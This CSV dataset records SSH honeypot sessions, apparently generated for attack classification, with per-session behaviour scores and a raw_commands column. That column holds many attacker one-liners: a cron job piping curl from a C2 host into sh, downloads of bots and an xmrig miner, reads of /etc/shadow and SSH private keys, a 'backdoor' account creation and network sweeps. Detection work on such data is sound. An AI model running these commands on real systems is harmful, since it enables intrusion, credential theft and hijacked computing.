session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands
a8da5ebf97bf4697,222.186.15.101,China,5,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
d464c4f5ec8b4a3f,211.94.20.175,China,1,1,3,11,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
e43a9956661c4c57,45.142.212.100,Netherlands,5,1,2,15,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
5c6a475b218f4aeb,117.21.191.131,China,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
5d30b2231c404434,68.183.39.102,United States,4,1,5,42,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
058ea00a332e482b,178.128.21.44,Singapore,3,1,1,16,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
9e399d3b1c064073,211.94.20.175,China,3,0,0,13,22,0,0,0,0,0,0,0,0,0,
48870e2d2a4c4e0a,45.142.212.100,Netherlands,3,0,0,10,22,0,0,0,0,0,0,0,0,0,
8cb4920bfe7741a7,159.89.49.114,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
6a9745de8e414c02,92.255.57.210,Russia,1,1,1,6,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
a3effc2445454242,80.82.77.139,Netherlands,4,0,0,11,22,0,0,0,0,0,0,0,0,0,
7735b4b14a554aa9,193.32.162.8,Russia,4,0,0,10,22,0,0,0,0,0,0,0,0,0,
47fe64430bf948d8,206.189.32.177,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
02b097aa1d0e43de,167.71.13.196,United States,5,0,0,14,22,0,0,0,0,0,0,0,0,0,
956116d37ef7415d,58.218.211.36,China,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
aaa720a93cc24c31,91.240.118.172,Ukraine,1,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
53a19fc9833c40d7,159.89.49.114,United States,1,1,3,18,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
b73bbaaab74c4104,180.129.12.93,China,2,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
f15862a587cb46db,179.60.150.100,Brazil,4,0,0,16,22,0,0,0,0,0,0,0,0,0,
3b0a91eb3ddc4199,185.220.101.45,Germany,1,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
cfb925d5f65c4401,58.218.211.36,China,3,1,5,35,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
6d723c7dfbd74169,178.128.21.44,Singapore,1,1,2,11,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
9cdd12e1c7384a1b,178.128.21.44,Singapore,4,0,0,10,22,0,0,0,0,0,0,0,0,0,
c8f727c376bd4354,180.129.12.93,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,
3f69b1d54bae46cb,68.183.39.102,United States,2,1,2,18,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
018947b8e9b341f7,178.128.21.44,Singapore,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
600ff79a5ee54db3,92.255.57.210,Russia,4,1,3,32,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
87e7a0db3fc84e28,193.32.162.8,Russia,1,1,3,15,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
cd9f5a03f3374225,206.189.32.177,United States,2,0,0,4,22,0,0,0,0,0,0,0,0,0,
3a10d1d6f55b4bd5,134.209.82.19,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,
4f13f4e4f506434d,104.236.198.48,United States,3,1,3,29,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
eb3d3da4792b4609,218.92.0.158,China,3,1,1,12,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
a0d135ea38fc4b45,193.32.162.8,Russia,5,1,5,36,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
464da73b57c14f2b,218.92.0.158,China,4,0,0,16,22,0,0,0,0,0,0,0,0,0,
eee85d6598834232,80.82.77.139,Netherlands,5,1,2,29,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
c33f10b11b214af6,159.89.49.114,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,
104a37d69b424bb2,194.165.16.11,Russia,4,1,1,18,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
4cf924b57007431b,91.240.118.172,Ukraine,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
7ed72afdf2564040,58.218.211.36,China,4,1,2,19,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
4b9ebd64e58d4149,134.209.82.19,United States,3,1,2,24,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
0648506f06d34091,58.218.211.36,China,4,1,1,17,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
53f0fe074b104a59,159.89.49.114,United States,3,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
d8bf44dd0f3543a0,134.209.82.19,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
01552a983d8d489e,159.89.49.114,United States,4,0,0,12,22,0,0,0,0,0,0,0,0,0,
67e793029d15409b,185.220.101.45,Germany,4,0,0,12,22,0,0,0,0,0,0,0,0,0,
675d392711c34f2c,159.89.49.114,United States,1,1,2,7,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
90fd19d016544cf6,91.240.118.172,Ukraine,5,0,0,15,22,0,0,0,0,0,0,0,0,0,
3e8e838484d74903,164.92.98.77,United States,2,1,5,26,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
8feec6ba6d6a4292,180.129.12.93,China,4,0,0,14,22,0,0,0,0,0,0,0,0,0,
7ac3c2a417d943e4,218.92.0.158,China,2,1,2,11,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
2537859a2b9248c6,117.21.191.131,China,1,1,5,21,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
3ec84f934eb5422a,198.199.65.32,United States,1,1,2,14,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
7ca368d636a847e7,179.60.150.100,Brazil,4,1,2,18,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
bfa6ba044332416d,138.197.148.152,United States,1,1,5,16,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
a3ac807e71114732,178.128.21.44,Singapore,4,0,0,14,22,0,0,0,0,0,0,0,0,0,
bcc34431a8ce4e81,206.189.32.177,United States,2,0,0,9,22,0,0,0,0,0,0,0,0,0,
2f1564a8458544f4,159.89.49.114,United States,3,1,3,24,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &
9290f4ebf7ba4d46,80.82.77.139,Netherlands,2,0,0,8,22,0,0,0,0,0,0,0,0,0,
e44f3c52c91b4253,159.89.49.114,United States,4,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
c6ee9c29eb0b41db,178.128.21.44,Singapore,1,1,1,9,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
a4b1e491374d4788,157.245.108.55,United States,3,1,3,23,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &
a6d56b56164945ef,103.99.0.122,India,3,1,1,15,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
4e6f967c6f0b4033,5.188.86.172,Russia,3,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
9adf20db1415424e,185.220.101.45,Germany,3,0,0,11,22,0,0,0,0,0,0,0,0,0,
ce8b143cbbfc4abc,194.165.16.11,Russia,4,1,5,41,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
443ded979f5b4ac3,5.188.86.172,Russia,5,0,0,20,22,0,0,0,0,0,0,0,0,0,
0949a6556bf44a08,104.236.198.48,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,
7db49ff7adda4f27,103.99.0.122,India,2,0,0,8,22,0,0,0,0,0,0,0,0,0,
252ac9ce18734a67,218.92.0.158,China,4,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
7d2afebd8dbf41b3,193.32.162.8,Russia,4,0,0,11,22,0,0,0,0,0,0,0,0,0,
77d5bc31f9d34833,185.220.101.45,Germany,5,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
0edfe1dcdc3346b5,164.92.98.77,United States,4,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
b0ad76dd992b43b1,5.188.86.172,Russia,5,1,1,17,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
b37f324220364989,134.209.82.19,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,
1f1d0e557c2e43b6,117.21.191.131,China,4,1,3,30,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
0813fdd01fdf479b,104.236.198.48,United States,5,0,0,15,22,0,0,0,0,0,0,0,0,0,
e77846b744b6445d,92.255.57.210,Russia,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
da32558fadb04cf8,167.71.13.196,United States,1,1,5,21,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
df79b193cb6d4ad1,218.92.0.158,China,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
27089bf97ee94ad3,80.82.77.139,Netherlands,2,0,0,5,22,0,0,0,0,0,0,0,0,0,
c2ee4a7cd0674265,164.92.98.77,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
83f7e44c7f2f4ef1,134.209.82.19,United States,2,1,3,22,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
680ef60e801140bc,178.128.21.44,Singapore,5,1,5,47,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
4cdc10d09bbb4d20,157.245.108.55,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,
5ba2930ec268423e,159.89.49.114,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
de581fb755784057,159.89.49.114,United States,3,1,3,28,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
2a6d64c4cb494d74,103.99.0.122,India,3,0,0,8,22,0,0,0,0,0,0,0,0,0,
8379efc40f844dab,92.255.57.210,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,
cd298f23c3cd4ad3,198.199.65.32,United States,1,1,1,7,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
8403113b99414697,193.32.162.8,Russia,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
7bda3333b3c240d3,103.99.0.122,India,1,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
72476d3a2aa74d9d,164.92.98.77,United States,3,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
549c0ac8418b432f,159.89.49.114,United States,2,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
5a39da41d7484843,134.209.82.19,United States,3,1,2,15,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
db5829d9bad54f4a,167.71.13.196,United States,3,1,1,17,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
e3c6ba1bfb28488a,91.240.118.172,Ukraine,2,1,5,36,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
61a4acdc0db54658,159.89.49.114,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
35d8d682541b4c61,157.245.108.55,United States,3,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
c558323ba5484f96,58.218.211.36,China,1,0,0,5,22,0,0,0,0,0,0,0,0,0,
41c4aa12c3f34f40,193.32.162.8,Russia,3,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
c138bfede18949f1,206.189.32.177,United States,1,1,3,11,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
ebfb2d43f20847a3,222.186.15.101,China,1,1,5,30,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
5cbdd195024c49dc,193.32.162.8,Russia,4,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
b5dc7da038f34d56,218.92.0.158,China,3,1,5,33,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
11d40d2d9de5418e,45.95.147.236,Netherlands,3,0,0,8,22,0,0,0,0,0,0,0,0,0,
750aac0544b74d7b,164.92.98.77,United States,3,1,1,15,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
de242fa59a444bcb,193.32.162.8,Russia,3,0,0,5,22,0,0,0,0,0,0,0,0,0,
cbeb218adf554d47,92.255.57.210,Russia,5,1,5,25,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
011d9161876b4c42,185.220.101.45,Germany,1,1,5,26,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
f0b0702a2d284f0b,45.142.212.100,Netherlands,1,0,0,6,22,0,0,0,0,0,0,0,0,0,
fd709cc583ef4f22,179.60.150.100,Brazil,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
e9e08ee9d43b4bd3,45.95.147.236,Netherlands,5,1,3,14,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
5fdce418b37d487c,138.197.148.152,United States,4,0,0,9,22,0,0,0,0,0,0,0,0,0,
edf9cb23fdc043b1,157.245.108.55,United States,5,0,0,16,22,0,0,0,0,0,0,0,0,0,
3e1fbd0746464ee5,117.21.191.131,China,1,1,5,30,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
c0f1ca7ca19044b7,117.21.191.131,China,2,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
248319c001244ecc,92.255.57.210,Russia,4,1,5,37,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
590f1eed9a614fa4,194.165.16.11,Russia,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
888d6143dcaf408f,45.142.212.100,Netherlands,2,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
c7b4ef6decce4c67,179.60.150.100,Brazil,2,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
000f08dc7a6b48a4,5.188.86.172,Russia,4,1,1,14,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
33df258ee50e4cbd,117.21.191.131,China,5,1,5,41,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
fe731456cc0f4354,45.95.147.236,Netherlands,4,0,0,13,22,0,0,0,0,0,0,0,0,0,
fa1e12d225b741ee,194.165.16.11,Russia,2,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
f5f6c2a09c304490,206.189.32.177,United States,1,1,3,14,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
2f39f3b15db94520,5.188.86.172,Russia,1,1,2,10,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
dea7e3884581420d,58.218.211.36,China,5,1,5,38,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
73930ff4ec5a4484,58.218.211.36,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,
89792a99f73a4e61,91.240.118.172,Ukraine,1,1,1,5,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
572eed1f67b644b7,193.32.162.8,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,
9d1a11d67bf04474,104.236.198.48,United States,4,1,5,34,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
8d9d54ad67d64c3e,193.32.162.8,Russia,3,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
7d4136a4cf644e41,117.21.191.131,China,1,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
fb94e730f2004659,222.186.15.101,China,3,0,0,13,22,0,0,0,0,0,0,0,0,0,
51f2e937ffd5431f,45.142.212.100,Netherlands,1,1,3,16,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
c77ea00131904784,104.236.198.48,United States,4,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
2a5eea9f1f254465,218.92.0.158,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,
f1858ef9b3f44cd1,91.240.118.172,Ukraine,1,1,3,13,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
6c027b8a5465417d,103.99.0.122,India,2,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
05031bddc83f46c5,91.240.118.172,Ukraine,1,0,0,6,22,0,0,0,0,0,0,0,0,0,
a003c00fe4094bfd,138.197.148.152,United States,3,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
665dd88abe10417d,80.82.77.139,Netherlands,4,1,2,27,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
ba86f65382714114,45.95.147.236,Netherlands,4,1,5,44,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
8bdabbe4b1a64815,179.60.150.100,Brazil,5,1,5,42,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
86597852fe1f451a,45.95.147.236,Netherlands,2,0,0,7,22,0,0,0,0,0,0,0,0,0,
5675fbab7f244afd,198.199.65.32,United States,2,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
e5afb8b2a3134a27,68.183.39.102,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,
bcbf6754bdc84682,194.165.16.11,Russia,5,0,0,15,22,0,0,0,0,0,0,0,0,0,
f94df360234b47eb,5.188.86.172,Russia,1,1,3,15,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
e1635b3ac9f24aaf,218.92.0.158,China,3,1,1,18,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
fd1c7e4f6b634d49,178.128.21.44,Singapore,3,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
56ea6566efd9477f,80.82.77.139,Netherlands,2,1,3,25,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
3ddc4e9eb1ac4110,117.21.191.131,China,5,0,0,17,22,0,0,0,0,0,0,0,0,0,
6cde62f05ff54dc9,159.89.49.114,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,
b16cc99aba2d4e13,104.236.198.48,United States,2,1,5,28,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
09d8be83d14d4081,68.183.39.102,United States,1,0,0,2,22,0,0,0,0,0,0,0,0,0,
8c7d663d8cc641ed,68.183.39.102,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,
537040c447b84e20,80.82.77.139,Netherlands,1,0,0,5,22,0,0,0,0,0,0,0,0,0,
b5da697858bb4ae5,206.189.32.177,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,
5888ad2ae8e546ed,45.142.212.100,Netherlands,5,1,3,24,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
16ba6dc4ed384e5b,179.60.150.100,Brazil,4,0,0,16,22,0,0,0,0,0,0,0,0,0,
147a9e063c6e4566,198.199.65.32,United States,5,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
6e608544e2e44306,92.255.57.210,Russia,5,1,2,23,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
67ba23f253c24781,218.92.0.158,China,4,1,3,24,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
967793c7f7ce417c,198.199.65.32,United States,2,1,3,26,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
eaf3a0d070414c85,180.129.12.93,China,5,1,3,35,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
c57192570bfd4cda,180.129.12.93,China,3,1,2,10,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
